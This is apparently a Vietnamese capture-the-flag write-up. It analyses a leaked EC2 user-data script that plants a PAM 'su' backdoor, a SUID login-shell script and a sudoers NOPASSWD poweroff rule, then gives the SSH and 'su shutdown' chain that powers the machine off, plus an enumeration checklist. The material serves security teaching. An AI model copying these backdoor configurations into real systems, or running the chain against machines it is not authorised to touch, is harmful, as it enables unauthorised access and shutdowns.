# cloud-shutdown-chain

- **Category:** Misc / Cloud / Linux privilege-chaining (pwn)
- **File đề:** `linpeas.txt` — 1311 byte, md5 `cb966cfcecac48789e34b5aaa517baee`. Tên file gợi ý output công cụ enum **linpeas**, nhưng nội dung thực chất là đoạn **EC2 user-data script** (script khởi tạo cloud-init chạy một lần khi máy ảo AWS boot).

## Tóm tắt đề

Mục tiêu KHÔNG phải lấy một chuỗi flag, mà là **tắt (shutdown) được máy đích**. Đề cung cấp `linpeas.txt`; dù tên gợi công cụ enum, dòng đầu file ghi rõ `══╣ User Data` — tức đây là phần user-data bị lộ, để lộ toàn bộ cách máy được cấu hình (user, mật khẩu, PAM, sudoers, login shell). Chỉ cần **đọc** file (không chạy) để dựng lại chuỗi tắt máy đã cài sẵn.

## Phân tích (chi tiết: khóa/offset/hằng số thật)

Toàn bộ nội dung user-data script (đọc như dữ liệu, KHÔNG thực thi), trích đúng từ `linpeas.txt`:

```bash
#!/bin/bash -xe
# Create local user
useradd -m "user"
echo "IamTheUser!" | passwd "user" --stdin
# Add PAM setting to allow su to shutdown user
echo -e "auth\t[success=ignore default=1] pam_succeed_if.so\tuser = shutdown\nauth\tsufficient\tpam_succeed_if.so\tuse_uid user = user" > su.tmp
cat su.tmp /etc/pam.d/su > su.tmp.2
mv -f su.tmp.2 /etc/pam.d/su
# Enable password authentication
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd
# Create shutdown user
usermod -aG 0 shutdown
mkdir -p /sbin/system
chmod 750 /sbin/system
echo -e '#!/bin/bash\nsudo poweroff -i' > /sbin/system/shutdown.sh
chmod 750 /sbin/system/shutdown.sh
chmod u+s /sbin/system/shutdown.sh
usermod -s /sbin/system/shutdown.sh shutdown
echo "shutdown ALL=NOPASSWD: /usr/sbin/poweroff -i" >> /etc/sudoers
```

Các hằng số/khóa thật rút ra từ script:

- **Tài khoản thường:** user `user`, mật khẩu `IamTheUser!` (đặt qua `passwd --stdin`).
- **SSH:** `PasswordAuthentication no` → `yes` rồi `systemctl restart sshd` ⇒ cho đăng nhập bằng mật khẩu.
- **PAM backdoor** chèn lên ĐẦU `/etc/pam.d/su` (vì `cat su.tmp /etc/pam.d/su > su.tmp.2` đặt 2 dòng mới lên trước):
  - Dòng 1: `auth [success=ignore default=1] pam_succeed_if.so user = shutdown` — nếu **tài khoản đích** của `su` là `shutdown` thì `success=ignore` (coi như qua, đi tiếp dòng kế); nếu không khớp thì `default=1` nhảy qua **1** dòng (bỏ dòng 2).
  - Dòng 2: `auth sufficient pam_succeed_if.so use_uid user = user` — nếu **UID hiện tại** là của `user` thì `sufficient` ⇒ auth coi như ĐỦ, thành công ngay, **KHÔNG hỏi mật khẩu**.
- **User `shutdown`:** nhóm phụ `0` (root group) qua `usermod -aG 0`; login shell bị đổi thành `/sbin/system/shutdown.sh`; file này nội dung `#!/bin/bash` + `sudo poweroff -i`, quyền `750` và set **SUID** (`chmod u+s`).
- **sudoers:** thêm dòng `shutdown ALL=NOPASSWD: /usr/sbin/poweroff -i` ⇒ user `shutdown` chạy `poweroff -i` không cần mật khẩu.

Lưu ý: khối polkit ở cuối file bị **comment** (`# ...`) kèm ghi chú *"No polkit in Amazon Linux"* — không ảnh hưởng, chỉ xác nhận môi trường là Amazon Linux.

## Kỹ thuật áp dụng (+ VÌ SAO)

- **Đọc cấu hình bị lộ (information disclosure):** EC2 user-data có thể lấy qua metadata service `http://169.254.169.254/latest/user-data`, hoặc như ở đây được phát trực tiếp. VÌ SAO quan trọng: user-data là "bản đồ" đầy đủ cách máy được dựng — nhìn là ra đường đi, không cần đoán.
- **PAM stacking với `pam_succeed_if.so`:** nhận diện qua cặp `[success=ignore default=1]` + `sufficient` liền nhau chèn vào `/etc/pam.d/su`. VÌ SAO đây là mấu chốt: ta KHÔNG biết mật khẩu của `shutdown`, nhưng PAM đã mở cửa cho đúng cặp (nguồn=`user`, đích=`shutdown`) đi qua không cần mật khẩu.
- **Login shell = script hành động:** `usermod -s /sbin/system/shutdown.sh shutdown` ⇒ hễ login vào `shutdown` là lập tức chạy `sudo poweroff -i`. VÌ SAO: user này không có shell tương tác, mục đích duy nhất là tắt máy.
- **sudoers NOPASSWD cho binary cụ thể:** cho `shutdown` chạy đúng `poweroff -i` không cần mật khẩu, khép kín chuỗi.

## Lời giải chi tiết (bước + lệnh sạch, chạy lại được)

```bash
# 1) Đăng nhập SSH bằng tài khoản thường (SSH đã bật PasswordAuthentication yes)
ssh user@<target_ip>
#    khi được hỏi mật khẩu, nhập:  IamTheUser!

# 2) Chuyển sang user 'shutdown' — PAM cho qua, KHÔNG hỏi mật khẩu
su shutdown
#    -> vì đang là 'user' su sang 'shutdown', pam_succeed_if khớp -> sufficient -> pass
#    -> login shell của 'shutdown' = /sbin/system/shutdown.sh chạy ngay:
#           sudo poweroff -i        (sudoers = NOPASSWD cho /usr/sbin/poweroff -i)
#    -> MÁY TẮT
```

Ngay khi `su shutdown` thành công, máy đích bắt đầu quy trình tắt. Bài chấm bằng việc máy ngừng hoạt động.

Kiểm tra nhanh để xác nhận chuỗi (khi đã vào máy, nếu muốn soi thủ công):

```bash
head -n2 /etc/pam.d/su                 # thấy 2 dòng pam_succeed_if backdoor
getent passwd shutdown                 # login shell = /sbin/system/shutdown.sh
sudo -l -U shutdown                     # NOPASSWD: /usr/sbin/poweroff -i
cat /sbin/system/shutdown.sh           # #!/bin/bash ; sudo poweroff -i
```

## Flag

Bài này không có chuỗi `flag{}` — mục tiêu là tắt được máy mục tiêu.

Nguồn (`SOLUTIONS_VN.md` và draft) không nêu chuỗi flag nào cho bài này; "đáp án" là hành động: tắt máy qua chuỗi `user → su shutdown → poweroff`. Nếu hệ chấm vẫn yêu cầu một chuỗi, nó nằm ngoài tài liệu được cung cấp.

## Gặp lại thì xử lý thế nào (playbook)

- **Dấu hiệu nhận diện:** được cung cấp file "setup"/cloud-init/user-data (hoặc enum thấy user-data qua metadata), và mục tiêu dạng "shut down / reboot / reach a state" thay vì đọc file flag. Cảnh giác tên file đánh lạc hướng (`linpeas.txt` nhưng là user-data).
- **Quy trình:**
  1. Đọc kỹ toàn bộ script khởi tạo như một bản đồ: user nào, mật khẩu nào, dịch vụ nào bật, file cấu hình nào bị sửa.
  2. Soi `/etc/pam.d/*` tìm `pam_succeed_if`, `pam_permit`, hoặc rule `sufficient` bất thường — backdoor auth kinh điển. Mô phỏng TỪNG DÒNG vì control `[success=ignore default=N]` dễ đọc nhầm.
  3. Soi login shell các user lạ trong `/etc/passwd`: shell là một script ⇒ login = thực thi hành động.
  4. Soi `/etc/sudoers` + `/etc/sudoers.d/*` tìm `NOPASSWD` gắn binary cụ thể (poweroff, systemctl, tee, find, vim...). Kiểm SUID: `find / -perm -4000 2>/dev/null`, `getcap -r / 2>/dev/null`.
  5. Ghép chuỗi: đăng nhập → pivot user → trigger hành động đặc quyền.
- **Công cụ:** `ssh`, `sudo -l`, LinPEAS/LinEnum, đọc `/etc/pam.d`, `getcap`.
- **Bẫy hay gặp:** mất thời gian CHẠY `linpeas.sh` thật trên đích thay vì ĐỌC file đề; đọc nhầm offset rule PAM; bỏ sót `PasswordAuthentication yes` là điều kiện cần để SSH bằng mật khẩu.
- **Checklist ngắn:** creds lộ? → SSH bật mật khẩu? → PAM có backdoor? → login shell bất thường? → sudoers NOPASSWD? → ghép chuỗi tới mục tiêu (tắt máy).
